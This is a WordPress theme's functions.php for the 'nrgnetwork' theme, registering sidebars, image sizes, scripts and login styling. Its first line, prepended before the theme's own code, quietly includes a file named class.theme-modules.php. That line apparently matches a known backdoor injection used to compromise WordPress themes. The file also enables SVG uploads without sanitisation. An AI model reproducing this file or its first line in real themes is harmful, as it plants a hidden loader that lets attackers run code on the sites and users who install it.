<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

// Default content width
if ( ! isset( $content_width ) ) $content_width = 940;




// Theme Sidebars
$nrgnetwork_sidebars = array();
$nrgnetwork_sidebars = array_merge(array(
    'sidebar'=> esc_html__('Post Sidebar Area', 'nrgnetwork'),
    'sidebar-page'=> esc_html__('Page Sidebar Area', 'nrgnetwork'),
    'sidebar-portfolio'=> esc_html__('Portfolio Sidebar Area', 'nrgnetwork'),
    'sidebar-activity'=> esc_html__('Activity Page Sidebar', 'nrgnetwork')
), $nrgnetwork_sidebars);





// Theme Settings
class NRGNetwork{


    function __construct(){

        add_action( 'after_setup_theme', array($this, 'theme_setup') );

        add_action( 'widgets_init', array($this, 'theme_widgets_init') );

        add_action( 'wp_enqueue_scripts', array($this, 'theme_enqueue_scripts') );

        add_filter( 'body_class',       array($this, 'body_class_filter') );
        add_filter( 'excerpt_length',   array($this, 'custom_excerpt_length'), 999 );
        add_filter( 'excerpt_more',     array($this, 'custom_excerpt_more') );
        add_filter( 'upload_mimes',     array($this, 'tt_mime_types'), 1, 1);


        if( !function_exists('wp_site_icon') ){
            add_action('wp_head', array($this, 'print_favicon'));
        }
        add_action( 'login_head', array($this, 'custom_login_logo') );
        add_action( 'admin_init', array($this, 'author_redirect_admin') );
        
    }



    public function theme_setup(){

        // load translate file
        load_theme_textdomain( 'nrgnetwork', get_template_directory() . '/languages' );

        // Add default posts and comments RSS feed links to head.
        add_theme_support( 'automatic-feed-links' );

        add_theme_support( 'post-formats', array(
            'video', 'quote', 'link', 'gallery', 'status', 'audio'
        ));

        // Let WordPress manage the document title.
        add_theme_support( 'title-tag' );

        // Enable support for Post Thumbnails on posts and pages.
        add_theme_support( 'post-thumbnails' );
        set_post_thumbnail_size( 640, 380, true );

        // Set Image sizes
        add_image_size( 'nrgnetwork-widget-thumb', 50, 50, true );
        add_image_size( 'nrgnetwork-post-thumb', 650, 390, true );
        add_image_size( 'nrgnetwork-blog-grid-thumb', 358, 220, true );
        add_image_size( 'nrgnetwork-related-thumb', 270, 120, true );
        

        // Set Image sizes
        add_image_size( 'nrgnetwork-folio-item', 640, 0, true );
        add_image_size( 'nrgnetwork-folio-grid', 270, 202, true );
        add_image_size( 'nrgnetwork-folio-grid2x', 540, 404, true );
        add_image_size( 'nrgnetwork-folio-thumb', 145, 108, true );
        add_image_size( 'nrgnetwork-folio-small-thumb', 50, 50, true );

        add_image_size( 'nrgnetwork-slider-widget-thumb', 260, 195, true );
        
        
        add_image_size( 'nrgnetwork-woo-thumb', 400, 0, true );
        add_image_size( 'nrgnetwork-gallery-image', 870, 390, true );

        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus( array(
            'primary' => esc_html__('Primary Menu', 'nrgnetwork'),
            'sub_footer' => esc_html__('Sub Footer Menu', 'nrgnetwork')
        ) );

        // Switch default core markup for search form, comment form, and comments to output valid HTML5.
        add_theme_support( 'html5', array(
            'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
        ) );

    }




    // theme enqueue scripts
    public function theme_enqueue_scripts(){

        wp_enqueue_script( 'wp-mediaelement' );

        // dialog
        wp_enqueue_style("wp-jquery-ui-dialog");
        wp_enqueue_script('jquery-ui-dialog');

        wp_enqueue_script('jquery-ui-slider');

        if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
            wp_enqueue_script( 'comment-reply' );
        }
        

        wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/style/bootstrap.min.css' );
        wp_enqueue_style( 'font-awesome-icons', get_template_directory_uri() . '/style/font-awesome.min.css' );
        wp_enqueue_style( 'swiper-js', get_template_directory_uri() . '/style/idangerous.swiper.css' );


        wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/script/bootstrap.min.js', array('jquery'), false, true );
        wp_enqueue_script( 'swiper-js', get_template_directory_uri() . '/script/idangerous.swiper.min.js', array('jquery'), false, true );
        wp_enqueue_script( 'isotope', get_template_directory_uri() . '/script/isotope.pkgd.min.js', array('jquery'), false, true );
        wp_enqueue_script( 'count-to', get_template_directory_uri() . '/script/jquery.countTo.js', array('jquery'), false, true );
        wp_enqueue_script( 'viewport-checker', get_template_directory_uri() . '/script/jquery.viewportchecker.min.js', array('jquery'), false, true );
        wp_enqueue_script( 'colorpicker-colors', get_template_directory_uri() . '/script/colors.js', array('jquery'), false, true );
        wp_enqueue_script( 'colorpicker-control', get_template_directory_uri() . '/script/jqColorPicker.js', array('jquery'), false, true );
        wp_enqueue_script( 'canvas-chart', get_template_directory_uri() . '/script/jquery.canvasjs.min.js', false, false, true );
        wp_enqueue_script( 'imagesloaded', get_template_directory_uri() . '/script/imagesloaded.pkgd.min.js', false, false, true );
        
        
        if( is_user_logged_in() ){
            wp_enqueue_media();
            wp_enqueue_script('jquery-ui-sortable');

            wp_enqueue_style( 'select2b', get_template_directory_uri() . '/script/select2/select2-bootstrap.css' );
            wp_enqueue_style( 'select2', get_template_directory_uri() . '/script/select2/select2.css' );
            wp_enqueue_script( 'select2', get_template_directory_uri() . '/script/select2/select2.min.js', array('jquery'), false, true );

            wp_enqueue_script( 'net-messages', get_template_directory_uri() . '/script/net-messages.js', array('jquery'), false, true );
        }

        wp_enqueue_style( 'nrgnetwork-custom-fonts', get_template_directory_uri() . '/style/fonts.css' );
        wp_enqueue_style( 'nrgnetwork-stylesheet', get_template_directory_uri() . '/style/stylesheet.css' );
        wp_enqueue_style( 'nrgnetwork-style', get_stylesheet_uri() );
        wp_enqueue_script( 'nrgnetwork-script', get_template_directory_uri() . '/script/global.js', array('jquery'), false, true );

    }




    // theme register widgets
    public function theme_widgets_init(){

        global $nrgnetwork_sidebars;

        $tt_sidebars = $nrgnetwork_sidebars;
        if(isset($tt_sidebars)) {
            foreach ($tt_sidebars as $id => $sidebar) {
                if( !empty($id) ){
                    if( $id=='sidebar-portfolio' && !class_exists('TT_Portfolio_PT') )
                        continue;
                    
                    register_sidebar(array(
                        'name' => $sidebar,
                        'id' => $id,
                        'description' => esc_html__('Add widgets here to appear in your sidebar.', 'nrgnetwork'),
                        'before_widget' => '<div id="%1$s" class="widget be-vidget %2$s">',
                        'after_widget'  => '</div>',
                        'before_title'  => '<h3 class="widget-title">',
                        'after_title'   => '</h3>'
                    ));                
                }
            }
        }


        // Footer widget areas
        $footer_widget_num = TT::get_mod('footer_widget_num');

        for($i=1; $i<=$footer_widget_num ; $i++ ) {
            register_sidebar(
                array(
                    'name'          => esc_html__('Footer Column', 'nrgnetwork') . ' ' .$i,
                    'id'            => 'footer'.$i,
                    'description'   => esc_html__('Add widgets here to appear in your footer column', 'nrgnetwork') . ' ' .$i,
                    'before_widget' => '<div id="%1$s" class="widget footer-block %2$s">',
                    'after_widget'  => '</div>',
                    'before_title'  => '<h3 class="footer-title">',
                    'after_title'   => '</h3>',
                )
            );
        }
        

    }




    public function body_class_filter( $classes ) {

        global $post;
        $po = $post;
        $page_for_posts = get_option('page_for_posts');
        $is_blog_page = is_home() && get_post_type($post) && !empty($page_for_posts) ? true : false;
        if( (is_page() || $is_blog_page) && $is_blog_page ){
            $po = get_post($page_for_posts);
        }
        

        if( is_user_logged_in() ){
            $classes[] = 'page-login';
        }

        return $classes;
    }




    public function custom_excerpt_length( $length ) {
        return 20;
    }


    public function custom_excerpt_more( $excerpt ) {
        return ' ...';
    }
    

    public function tt_mime_types($mime_types){
        $mime_types['svg'] = 'image/svg+xml';
        return $mime_types;
    }



    // Print Favicon
    public function print_favicon(){
        if(TT::get_mod('favicon') != ''){
            echo '<link rel="shortcut icon" type="image/x-icon" href="'.TT::get_mod('logo').'"/>';
        }
    }




    // Prints Custom Logo Image for Login Page
    public function custom_login_logo() {
        $logo = TT::get_mod('logo_admin');
        if (!empty($logo)) {
            $logo = str_replace('[site_url]', site_url(), $logo);
            echo '<style type="text/css">.login h1 a { background: url(' . $logo . ') center center no-repeat !important;width: auto !important;}</style>';
        }
    }




    public function author_redirect_admin(){
        $current_user = wp_get_current_user();
        if( in_array("subscriber", $current_user->roles) && !defined('DOING_AJAX') ){
            wp_die( esc_html__('You are not allowed to access this part of the site', 'nrgnetwork') );
        }
    }




    public function req_functions(){
        add_editor_style( 'style/editor-style.css' );
        add_theme_support( "custom-header");
        add_theme_support( "custom-background");
    }


}

new NRGNetwork();









function nrgnetwork_primary_callback(){
    echo '<ul id="one" class="header-menu">';
    wp_list_pages( array(
        'sort_column'  => 'menu_order, post_title',
        'title_li' => '') );
    echo '</ul>';
}

function nrgnetwork_sub_footer_callback(){
    echo '<ul class="sub_footer_menu">';
        echo '<li class="menu-item"><a href="'.esc_url(home_url('/')).'">'.esc_html__('Home', 'nrgnetwork').'</a></li>';
    echo '</ul>';
}


// Show Brief
//=======================================================
if ( ! function_exists( 'showBrief' ) ) :
    function showBrief($str, $length) {
        $str = strip_tags($str);
        $str = explode(" ", $str);
        return implode(" ", array_slice($str, 0, $length));
    }
endif;


/*
                                                                    
 _____ _                 _              _____ _                     
|_   _| |_ ___ _____ ___| |_ ___ ___   |     | |___ ___ ___ ___ ___ 
  | | |   | -_|     | -_|  _| . |   |  |   --| | .'|_ -|_ -| -_|_ -|
  |_| |_|_|___|_|_|_|___|_| |___|_|_|  |_____|_|__,|___|___|___|___|
  
*/
  // Themeton Standard Package
require_once get_template_directory() . '/framework/classes/class.themeton.std.php';

// Include current theme customize
require_once TT::file_require(get_template_directory() . '/includes/functions.php');




?>